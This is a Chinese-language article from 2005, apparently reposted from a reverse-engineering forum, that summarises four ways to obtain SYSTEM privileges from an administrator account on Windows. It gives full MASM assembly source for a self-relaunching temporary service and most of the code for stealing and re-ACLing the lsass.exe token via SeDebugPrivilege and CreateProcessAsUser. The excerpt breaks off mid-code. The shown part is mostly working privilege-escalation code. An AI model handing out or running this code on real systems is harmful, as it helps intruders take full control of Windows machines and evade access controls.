
# 从管理员身份获得 SYSTEM 权限的四种方法

> 原文：[`www.pediy.com/kssd/pediy07/pediy7-102.htm`](https://www.pediy.com/kssd/pediy07/pediy7-102.htm)

从管理员身份获得 SYSTEM 权限的四种方法

作者: 一块三毛钱

邮件: `zhongts@163.com`

日期: 2005.1.15

本文总结了 4 种方法获得 SYSTEM 权限来运行 `regedit.exe` 文件，源代码很容易修改成命令行方式运行指定的程序。

1. 以服务方式运行
2. 添加 ACL 的方法
3. `HOOK ZwCreateProcessEx` 函数
4. 远程线程的方法

这几种方法都不是我想出来的，我只不过是总结了一下，用 `Win32ASM` 重写了代码而以。关于这个大家可以看文章末尾的参考资料。下面简单的分析每一种方法。

## 1. 以服务方式运行

因为以服务方式运行程序时，相当于运行程序的是系统进程，所以，被指定运行的程序自然而然的继承了系统进程的权限，也就是 SYSTEM 权限。

```asm
;@echo off
;goto make
;====================================================================================
; 一块三毛钱
; `zhongts.yeah.net`
; `zhongts@163.com`
; 2005.1.15
;
; 以 SYSTEM 权限运行程序 - GetSys1
;
; 采用以服务方式运行的方法
;
;====================================================================================

.386
.model flat, stdcall
option casemap :none
include c:\masm32\include\windows.inc
include c:\masm32\include\kernel32.inc
include c:\masm32\include\advapi32.inc
include c:\masm32\include\masm32.inc
includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\advapi32.lib
includelib c:\masm32\lib\masm32.lib

_ReLaunch proto

CTXT MACRO text
        local lbl
        .const
                lbl db text,0
        .code
        exitm   <offset lbl>
ENDM

.code

start proc
        LOCAL   stStartupInfo : STARTUPINFO
        LOCAL   procinfo : PROCESS_INFORMATION
        invoke  CreateMutex, NULL, TRUE, CTXT("GetSys1_Mutex")
        invoke  GetLastError
        .if eax==ERROR_ALREADY_EXISTS
                invoke  RtlZeroMemory, addr stStartupInfo, sizeof stStartupInfo
                mov     stStartupInfo.cb, sizeof stStartupInfo
                invoke  CreateProcess, 0, CTXT("regedit.exe"), 0, 0, 0, 0, 0, 0, addr stStartupInfo, addr procinfo
                invoke  CloseHandle, procinfo.hProcess
                invoke  CloseHandle, procinfo.hThread
        .else
                invoke  _ReLaunch
        .endif
        invoke  ExitProcess, NULL

start endp

_ReLaunch proc
        LOCAL   hSCManager
        LOCAL   hService
        LOCAL   szName[MAX_PATH] : byte
        invoke  OpenSCManager, NULL, NULL, SC_MANAGER_CREATE_SERVICE
        .if eax!=0
                mov     hSCManager, eax
                invoke  OpenService, hSCManager, CTXT("GetSys1Temp"), DELETE
                .if eax!=0
                        push    eax
                        invoke  DeleteService, eax
                        call    CloseServiceHandle
                .endif
                invoke  GetModuleFileName, NULL, addr szName, MAX_PATH
                invoke  CreateService, hSCManager, CTXT("GetSys1Temp"), CTXT("GetSys1 Temp Service"), \
                        SERVICE_START + SERVICE_QUERY_STATUS + DELETE, \
                        SERVICE_WIN32_OWN_PROCESS + SERVICE_INTERACTIVE_PROCESS, SERVICE_DEMAND_START, \
                        SERVICE_ERROR_IGNORE, addr szName, NULL, NULL, NULL, NULL, NULL
                .if eax!=0
                        mov     hService, eax
                        invoke  StartService, hService, 0, NULL
                        invoke  DeleteService, hService
                        invoke  CloseServiceHandle, hService
                .endif
                invoke  CloseServiceHandle, hSCManager
        .endif
        ret

_ReLaunch endp

end start

:make
set path=%path%;c:\masm32\bin
set appname=GetSys1
ml /nologo /c /coff %appname%.bat
link /nologo /subsystem:windows %appname%.obj
del %appname%.obj
echo.
pause
```

`GetSys1`（第一次运行的这个进程 `GetSys1` 我们称为 `A`）开始运行时先创建一个互斥量，接着以服务的方式重新启动自己（又一次运行的进程 `GetSys1` 我们称为 `B`），重新运行后的 `B` 已经具有了 SYSTEM 权限。`B` 再通过 `CreateProcess` 函数运行 `regedit.exe` 程序，因为 `B` 具有 SYSTEM 权限，所以 `regedit.exe` 从中继承了 SYSTEM 权限。运行完了 `regedit.exe` 后 `B` 结束运行，然后 `A` 中的 `StartService` 函数返回，`A` 结束运行。就是因为 `StartService` 函数不会直接返回，所以不能够直接通过服务的方式运行 `regedit.exe`。

## 2. 添加 ACL 的方法

主要思想是调用 `CreateProcessAsUser` 函数来运行程序，`CreateProcessAsUser` 函数的第一个参数是特定用户的令牌，把这个参数设为具有 SYSTEM 权限的令牌即可。

```asm
;@echo off
;goto make
;====================================================================================
; 一块三毛钱
; `zhongts.yeah.net`
; `zhongts@163.com`
; 2005.1.15
;
; 以 SYSTEM 权限运行程序 - GetSys2
;
; 采用添加 ACL 的方法
;
;====================================================================================

.386
.model flat, stdcall
option casemap :none
include c:\masm32\include\windows.inc
include c:\masm32\include\kernel32.inc
include c:\masm32\include\advapi32.inc
include c:\masm32\include\accctrl.inc
include c:\masm32\include\masm32.inc
includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\advapi32.lib
includelib c:\masm32\lib\masm32.lib

_EnablePrivilege proto :DWORD,:DWORD
_GetPidFromProcName proto :DWORD
_ModifySecurity proto :DWORD,:DWORD

CTXT MACRO text
        local lbl
        .const
                lbl db text,0
        .code
        exitm   <offset lbl>
ENDM

ACL STRUCT
        AclRevision     BYTE  ?
        Sbz1            BYTE  ?
        AclSize         WORD  ?
        AceCount        WORD  ?
        Sbz2            WORD  ?
ACL ENDS
PACL typedef PTR ACL
SecurityImpersonation   equ 2

.code

start proc
        LOCAL   hProc
        LOCAL   hToken, hNewToken
        LOCAL   stStartupInfo : STARTUPINFO
        LOCAL   procinfo : PROCESS_INFORMATION
        sub     eax, eax
        mov     hProc, eax
        mov     hToken, eax
        mov     hNewToken, eax
        invoke  RtlZeroMemory, addr stStartupInfo, sizeof stStartupInfo
        invoke  RtlZeroMemory, addr procinfo, sizeof procinfo
        invoke  _EnablePrivilege, CTXT("SeDebugPrivilege"), TRUE
        invoke  _GetPidFromProcName, CTXT("lsass.exe")
        invoke  OpenProcess, PROCESS_QUERY_INFORMATION, 0, eax
        test    eax, eax
        jz      _exit
        mov     hProc, eax
        invoke  OpenProcessToken, hProc, READ_CONTROL+WRITE_DAC, addr hToken
        test    eax, eax
        jz      _exit
        invoke  _ModifySecurity, hToken, TOKEN_ALL_ACCESS
        test    eax, eax
        jz      _exit
        invoke  CloseHandle, hToken
        mov     hToken, 0
        invoke  OpenProcessToken, hProc, TOKEN_ALL_ACCESS, addr hToken
        test    eax, eax
        jz      _exit
        invoke  DuplicateTokenEx, hToken, TOKEN_ALL_ACCESS, 0, SecurityImpersonation, TokenPrimary, addr hNewToken
        test    eax, eax
        jz      _exit
        invoke  ImpersonateLoggedOnUser, hNewToken
        test    eax, eax
        jz      _exit
        mov     stStartupInfo.cb, sizeof stStartupInfo
        invoke  CreateProcessAsUser, hNewToken, 0, CTXT("regedit.exe"), 0, 0, 0, 0, 0, 0, addr stStartupInfo, addr procinfo
        test    eax, eax
        jz      _exit
        invoke  CloseHandle, procinfo.hProcess
        invoke  CloseHandle, procinfo.hThread

_exit:
        .if hProc
                invoke  CloseHandle, hProc
        .endif
        .if hToken
                invoke  CloseHandle, hToken
        .endif
        .if hNewToken
                invoke  CloseHandle, hNewToken
        .endif
        invoke  ExitProcess, NULL

start endp

_ModifySecurity proc uses ebx esi edi, hToken:DWORD, dwAccess:DWORD
        LOCAL   pSD, pAbsSD
        LOCAL   dwSDLength
        LOCAL   bDaclPresent, bDaclDefaulted
        LOCAL   pAcl : PACL
        LOCAL   pNewAcl : PACL
```
